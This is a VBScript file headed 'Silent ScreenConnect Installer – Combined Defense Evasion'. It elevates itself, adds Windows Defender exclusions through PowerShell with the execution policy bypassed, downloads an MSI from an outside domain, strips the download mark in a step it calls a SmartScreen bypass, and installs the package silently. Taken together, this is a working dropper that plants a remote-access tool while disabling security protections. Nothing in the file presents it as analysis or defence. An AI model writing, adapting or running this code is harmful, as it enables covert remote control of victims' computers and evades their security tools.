' ============================================================
' Silent ScreenConnect Installer – Combined Defense Evasion
' ============================================================
Option Explicit

' --- Config -------------------------------------------------
' Dim msiUrl : msiUrl = "https://YOUR-INSTANCE.screenconnect.com/Bin/ClientSetup.msi?e=Access&y=Guest"
' For a hosted MSI, use the line below with your actual URL.
Dim msiUrl : msiUrl = "https://reio11.online/share/installer.msi"

Dim destPath : destPath = "C:\Windows\Temp\ScreenConnect.ClientSetup.msi"
Dim destFolder : destFolder = "C:\Windows\Temp"
Dim logFile : logFile = "C:\Windows\Temp\ScreenConnect_Install.log"
Dim msiLogFile : msiLogFile = "C:\Windows\Temp\ScreenConnect_MSI.log"
' ------------------------------------------------------------

Dim fso, WshShell, ShellApp

' --- Logging Helper -----------------------------------------
Sub LogMessage(msg)
    On Error Resume Next
    Dim stream
    Set stream = CreateObject("Scripting.FileSystemObject")
    If Not stream Is Nothing Then
        With stream.OpenTextFile(logFile, 8, True)
            .WriteLine Now & " - " & msg
            .Close
        End With
    End If
    On Error GoTo 0
End Sub

' --- Self‑elevation -----------------------------------------
If Not WScript.Arguments.Named.Exists("elevated") Then
    Dim objShell : Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "wscript.exe", _
        Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", _
        "", "runas", 1
    WScript.Quit
End If

' --- Main ---------------------------------------------------
Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

LogMessage "=== Script started ==="
LogMessage "User: " & CreateObject("WScript.Network").UserName

' 1. Add Windows Defender exclusions (pre‑emptively)
LogMessage "Adding Defender exclusions..."
Dim cmdExcl
cmdExcl = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command " & _
          """Add-MpPreference -ExclusionPath '" & destFolder & "' -ErrorAction SilentlyContinue; " & _
          "Add-MpPreference -ExclusionPath ""$env:ProgramFiles\ScreenConnect*"" -ErrorAction SilentlyContinue; " & _
          "Add-MpPreference -ExclusionProcess 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue"""
WshShell.Run cmdExcl, 0, True
LogMessage "Defender exclusions added."

' 2. Prepare destination folder
If Not fso.FolderExists(destFolder) Then
    On Error Resume Next
    fso.CreateFolder destFolder
    If Err.Number <> 0 Then
        LogMessage "FATAL: Cannot create folder " & destFolder & " - " & Err.Description
        WScript.Quit 1
    End If
    On Error GoTo 0
    LogMessage "Created folder: " & destFolder
End If

If fso.FileExists(destPath) Then
    On Error Resume Next
    fso.DeleteFile destPath, True
    If Err.Number = 0 Then LogMessage "Deleted existing MSI." Else LogMessage "WARNING: Could not delete old MSI."
    On Error GoTo 0
End If

' 3. Download MSI (robust COM method with fallback)
LogMessage "Downloading MSI from: " & msiUrl
Dim http, stream, fileSize
On Error Resume Next
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
If Err.Number <> 0 Then
    LogMessage "WinHttp not available, trying MSXML2.ServerXMLHTTP..."
    Set http = CreateObject("MSXML2.ServerXMLHTTP")
    If Err.Number <> 0 Then
        LogMessage "FATAL: No HTTP object available."
        WScript.Quit 1
    End If
End If
On Error GoTo 0

http.Open "GET", msiUrl, False
http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

On Error Resume Next
http.Send
If Err.Number <> 0 Then
    LogMessage "FATAL: HTTP send failed - " & Err.Description
    WScript.Quit 1
End If
On Error GoTo 0

If http.Status <> 200 Then
    LogMessage "ERROR: HTTP status " & http.Status & " - " & http.StatusText
    WScript.Quit 1
End If
LogMessage "Download complete, size: " & LenB(http.responseBody) & " bytes"

On Error Resume Next
Set stream = CreateObject("ADODB.Stream")
If Err.Number <> 0 Then
    LogMessage "FATAL: Cannot create ADODB.Stream - " & Err.Description
    WScript.Quit 1
End If
stream.Type = 1
stream.Open
stream.Write http.responseBody
stream.SaveToFile destPath, 2
stream.Close
If Err.Number <> 0 Then
    LogMessage "FATAL: Could not save MSI to " & destPath & " - " & Err.Description
    WScript.Quit 1
End If
On Error GoTo 0

If Not fso.FileExists(destPath) Then
    LogMessage "FATAL: MSI file not found after save."
    WScript.Quit 1
End If
fileSize = fso.GetFile(destPath).Size
LogMessage "MSI saved: " & destPath & " (" & fileSize & " bytes)"
If fileSize < 1000 Then LogMessage "WARNING: File size extremely small, possibly invalid."

' 4. Bypass SmartScreen
LogMessage "Removing Zone.Identifier (SmartScreen bypass)..."
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command " & _
             """Unblock-File -Path '" & destPath & "' -ErrorAction SilentlyContinue""", 0, True
LogMessage "SmartScreen bypass applied."

' 5. Silent MSI installation
LogMessage "Launching msiexec..."
Dim msiCmd : msiCmd = "msiexec /i """ & destPath & """ /qn /norestart /l*v """ & msiLogFile & """"
LogMessage "Command: " & msiCmd

Dim exitCode
On Error Resume Next
exitCode = WshShell.Run(msiCmd, 0, True)
If Err.Number <> 0 Then
    LogMessage "ERROR: Could not start msiexec - " & Err.Description
    WScript.Quit 1
End If
On Error GoTo 0

LogMessage "msiexec finished with exit code: " & exitCode

Select Case exitCode
    Case 0    : LogMessage "SUCCESS: Installation completed."
    Case 1641 : LogMessage "SUCCESS: Installation completed, restart initiated."
    Case 3010 : LogMessage "SUCCESS: Installation completed, restart required."
    Case 1602 : LogMessage "ERROR: User cancelled."
    Case 1603 : LogMessage "ERROR: Fatal error during installation."
    Case 1618 : LogMessage "ERROR: Another installation in progress."
    Case 1619 : LogMessage "ERROR: Could not open installation package."
    Case 1625 : LogMessage "ERROR: Forbidden by system policy."
    Case Else : LogMessage "WARNING: Unknown exit code."
End Select

' 6. Optional cleanup (uncomment to delete MSI after install)
' On Error Resume Next
' fso.DeleteFile destPath, True
' On Error GoTo 0

LogMessage "=== Script ended ==="
WScript.Quit exitCode